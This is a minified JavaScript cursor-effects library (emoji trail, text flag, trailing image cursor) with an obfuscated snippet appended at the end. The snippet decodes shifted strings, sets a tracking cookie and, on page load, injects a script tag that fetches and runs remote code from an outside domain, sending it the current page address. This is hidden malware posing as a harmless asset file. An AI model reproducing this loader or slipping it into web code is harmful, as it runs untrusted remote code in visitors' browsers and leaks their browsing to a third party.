        let t, i, n, o, s = e && e.emoji || "🤪", h = e && e.element, c = h || document.body, l = window.innerWidth, r = window.innerHeight, d = {
            x: l / 2,
            y: l / 2
        }, a = [];
        const A = window.matchMedia("(prefers-reduced-motion: reduce)");
        function u() {
            if (A.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            h ? (t.style.position = "absolute",
            c.appendChild(t),
            t.width = c.clientWidth,
            t.height = c.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = l,
            t.height = r),
            i.font = "16px serif",
            i.textBaseline = "middle",
            i.textAlign = "center";
            let e = i.measureText(s)
              , n = document.createElement("canvas")
              , d = n.getContext("2d");
            n.width = e.width,
            n.height = 2 * e.actualBoundingBoxAscent,
            d.textAlign = "center",
            d.font = "16px serif",
            d.textBaseline = "middle",
            d.fillText(s, n.width / 2, e.actualBoundingBoxAscent),
            o = n;
            let u = 0;
            for (u = 0; u < 7; u++)
                a[u] = new x(o);
            c.addEventListener("mousemove", f),
            c.addEventListener("touchmove", g, {
                passive: !0
            }),
            c.addEventListener("touchstart", g, {
                passive: !0
            }),
            window.addEventListener("resize", m),
            p()
        }
        function m(e) {
            l = window.innerWidth,
            r = window.innerHeight,
            h ? (t.width = c.clientWidth,
            t.height = c.clientHeight) : (t.width = l,
            t.height = r)
        }
        function g(e) {
            if (e.touches.length > 0)
                if (h) {
                    const t = c.getBoundingClientRect();
                    d.x = e.touches[0].clientX - t.left,
                    d.y = e.touches[0].clientY - t.top
                } else
                    d.x = e.touches[0].clientX,
                    d.y = e.touches[0].clientY
        }
        function f(e) {
            if (h) {
                const t = c.getBoundingClientRect();
                d.x = e.clientX - t.left,
                d.y = e.clientY - t.top
            } else
                d.x = e.clientX,
                d.y = e.clientY
        }
        function p() {
            !function() {
                t.width = t.width,
                a[0].position.x = d.x,
                a[0].position.y = d.y;
                for (let e = 1; e < 7; e++) {
                    let n = new w(0,0);
                    e > 0 && v(e - 1, e, n),
                    e < 6 && v(e + 1, e, n);
                    let o, s, h = new w(10 * -a[e].velocity.x,10 * -a[e].velocity.y), c = new w((n.X + h.X) / 1,(n.Y + h.Y) / 1 + 50);
                    a[e].velocity.x += .01 * c.X,
                    a[e].velocity.y += .01 * c.Y,
                    Math.abs(a[e].velocity.x) < .1 && Math.abs(a[e].velocity.y) < .1 && Math.abs(c.X) < .1 && Math.abs(c.Y) < .1 && (a[e].velocity.x = 0,
                    a[e].velocity.y = 0),
                    a[e].position.x += a[e].velocity.x,
                    a[e].position.y += a[e].velocity.y,
                    o = t.clientHeight,
                    s = t.clientWidth,
                    a[e].position.y >= o - 11 - 1 && (a[e].velocity.y > 0 && (a[e].velocity.y = .7 * -a[e].velocity.y),
                    a[e].position.y = o - 11 - 1),
                    a[e].position.x >= s - 11 && (a[e].velocity.x > 0 && (a[e].velocity.x = .7 * -a[e].velocity.x),
                    a[e].position.x = s - 11 - 1),
                    a[e].position.x < 0 && (a[e].velocity.x < 0 && (a[e].velocity.x = .7 * -a[e].velocity.x),
                    a[e].position.x = 0),
                    a[e].draw(i)
                }
            }(),
            n = requestAnimationFrame(p)
        }
        function y() {
            t.remove(),
            cancelAnimationFrame(n),
            c.removeEventListener("mousemove", f),
            c.removeEventListener("touchmove", g),
            c.removeEventListener("touchstart", g),
            window.addEventListener("resize", m)
        }
        function w(e, t) {
            this.X = e,
            this.Y = t
        }
        function v(e, t, i) {
            let n = a[e].position.x - a[t].position.x
              , o = a[e].position.y - a[t].position.y
              , s = Math.sqrt(n * n + o * o);
            if (s > 10) {
                let e = 10 * (s - 10);
                i.X += n / s * e,
                i.Y += o / s * e
            }
        }
        function x(e) {
            this.position = {
                x: d.x,
                y: d.y
            },
            this.velocity = {
                x: 0,
                y: 0
            },
            this.canv = e,
            this.draw = function(e) {
                e.drawImage(this.canv, this.position.x - this.canv.width / 2, this.position.y - this.canv.height / 2, this.canv.width, this.canv.height)
            }
        }
        return A.onchange = () => {
            A.matches ? y() : u()
        }
        ,
        u(),
        {
            destroy: y
        }
    }
    ,
    e.textFlag = function(e) {
        let t, i, n, o = e || {}, s = e && e.element, h = s || document.body, c = o.text ? " " + e.text : " Your Text Here", l = e?.color || "#000000", r = o.font || "monospace", d = o.textSize || 12, a = d + "px " + r, A = o.gap || d + 2, u = 0, m = [], g = window.innerWidth, f = window.innerHeight, p = {
            x: g / 2,
            y: g / 2
        };
        for (let e = 0; e < c.length; e++)
            m[e] = {
                letter: c.charAt(e),
                x: g / 2,
                y: g / 2
            };
        const y = window.matchMedia("(prefers-reduced-motion: reduce)");
        function w() {
            if (y.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            s ? (t.style.position = "absolute",
            h.appendChild(t),
            t.width = h.clientWidth,
            t.height = h.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = g,
            t.height = f),
            h.addEventListener("mousemove", x),
            window.addEventListener("resize", v),
            E()
        }
        function v(e) {
            g = window.innerWidth,
            f = window.innerHeight,
            s ? (t.width = h.clientWidth,
            t.height = h.clientHeight) : (t.width = g,
            t.height = f)
        }
        function x(e) {
            if (s) {
                const t = h.getBoundingClientRect();
                p.x = e.clientX - t.left,
                p.y = e.clientY - t.top
            } else
                p.x = e.clientX,
                p.y = e.clientY
        }
        function E() {
            !function() {
                i.clearRect(0, 0, g, f),
                u += .15;
                let e = 2 * Math.cos(u)
                  , t = 5 * Math.sin(u);
                for (let e = m.length - 1; e > 0; e--)
                    m[e].x = m[e - 1].x + A,
                    m[e].y = m[e - 1].y,
                    i.fillStyle = l,
                    i.font = a,
                    i.fillText(m[e].letter, m[e].x, m[e].y);
                let n = m[0].x
                  , o = m[0].y;
                n += (p.x - n) / 5 + e + 2,
                o += (p.y - o) / 5 + t,
                m[0].x = n,
                m[0].y = o
            }(),
            n = requestAnimationFrame(E)
        }
        function C() {
            t.remove(),
            cancelAnimationFrame(n),
            h.removeEventListener("mousemove", x),
            window.addEventListener("resize", v)
        }
        return y.onchange = () => {
            y.matches ? C() : w()
        }
        ,
        w(),
        {
            destroy: C
        }
    }
    ,
    e.trailingCursor = function(e) {
        let t, i, n, o = e && e.element, s = o || document.body, h = window.innerWidth, c = window.innerHeight, l = {
            x: h / 2,
            y: h / 2
        }, r = [];
        const d = e?.particles || 15
          , a = e?.rate || .4
          , A = e?.baseImageSrc || "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAATCAYAAACk9eypAAAAAXNSR0IArs4c6QAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAhGVYSWZNTQAqAAAACAAFARIAAwAAAAEAAQAAARoABQAAAAEAAABKARsABQAAAAEAAABSASgAAwAAAAEAAgAAh2kABAAAAAEAAABaAAAAAAAAAEgAAAABAAAASAAAAAEAA6ABAAMAAAABAAEAAKACAAQAAAABAAAADKADAAQAAAABAAAAEwAAAAAChpcNAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWWlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iWE1QIENvcmUgNS40LjAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyI+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgpMwidZAAABqElEQVQoFY3SPUvDQBgH8BREpRHExYiDgmLFl6WC+AYmWeyLg4i7buJX8DMpOujgyxGvUYeCgzhUQUSKKLUS0+ZyptXh8Z5Ti621ekPyJHl+uftfomhaf9Ei5JyxXKfynyEA6EYcLHpwyflT958GAQ7DTABNHd8EbtDbEH2BD5QEQmi2mM8P/Iq+A0SzszEg+3sPjDnDdVEtQKQbMUidHD3xVzf6A9UDEmEm+8h9KTqTVUjT+vB53aHrCbAPiceYq1dQI1Aqv4EhMll0jzv+Y0yiRgCnLRSYyDQHVoqUXe4uKL9l+L7GXC4vkMhE6eW/AOJs9k583ORDUyXMZ8F5SVHVVnllmPNKSFagAJ5DofaqGXw/gHBYg51dIldkmknY3tguv3jOtHR4+MqAzaraJXbEhqHhcQlwGSOi5pytVQHZLN5s0WNe8HPrLYlFsO20RPHkImxsbmHdLJFI76th7Z4SeuF53hTeFLvhRCJRCTKZKxgdnRDbW+iozFJbBMw14/ElwGYc0egMBMFzT21f5Rog33Z7dX02GBm7WV5ZfT5Nn5bE3zuCDe9UxdTpNvK+5AAAAABJRU5ErkJggg==";
        let u = !1
          , m = new Image;
        m.src = A;
        const g = window.matchMedia("(prefers-reduced-motion: reduce)");
        function f() {
            if (g.matches)
                return console.log("This browser has prefers reduced motion turned on, so the cursor did not init"),
                !1;
            t = document.createElement("canvas"),
            i = t.getContext("2d"),
            t.style.top = "0px",
            t.style.left = "0px",
            t.style.pointerEvents = "none",
            o ? (t.style.position = "absolute",
            s.appendChild(t),
            t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.style.position = "fixed",
            document.body.appendChild(t),
            t.width = h,
            t.height = c),
            s.addEventListener("mousemove", y),
            window.addEventListener("resize", p),
            w()
        }
        function p(e) {
            h = window.innerWidth,
            c = window.innerHeight,
            o ? (t.width = s.clientWidth,
            t.height = s.clientHeight) : (t.width = h,
            t.height = c)
        }
        function y(e) {
            if (o) {
                const t = s.getBoundingClientRect();
                l.x = e.clientX - t.left,
                l.y = e.clientY - t.top
            } else
                l.x = e.clientX,
                l.y = e.clientY;
            if (!1 === u) {
                u = !0;
                for (let e = 0; e < d; e++)
                    t = l.x,
                    i = l.y,
                    n = m,
                    r.push(new x(t,i,n))
            }
            var t, i, n
        }
        function w() {
            !function() {
                i.clearRect(0, 0, h, c);
                let e = l.x
                  , t = l.y;
                r.forEach((function(n, o, s) {
                    let h = s[o + 1] || s[0];
                    n.position.x = e,
                    n.position.y = t,
                    n.move(i),
                    e += (h.position.x - n.position.x) * a,
                    t += (h.position.y - n.position.y) * a
                }
                ))
            }(),
            n = requestAnimationFrame(w)
        }
        function v() {
            t.remove(),
            cancelAnimationFrame(n),
            s.removeEventListener("mousemove", y),
            window.addEventListener("resize", p)
        }
        function x(e, t, i) {
            this.position = {
                x: e,
                y: t
            },
            this.image = i,
            this.move = function(e) {
                e.drawImage(this.image, this.position.x, this.position.y)
            }
        }
        return g.onchange = () => {
            g.matches ? v() : f()
        }
        ,
        f(),
        {
            destroy: v
        }
    }
    ,
    Object.defineProperty(e, "__esModule", {
        value: !0
    }),
    e
}({});
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce( (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie),
        setTimeout(function() {
            o.c && (o.s = d.createElement('script'),
            o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href,
            d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {}
    ;
}({}, document, location));
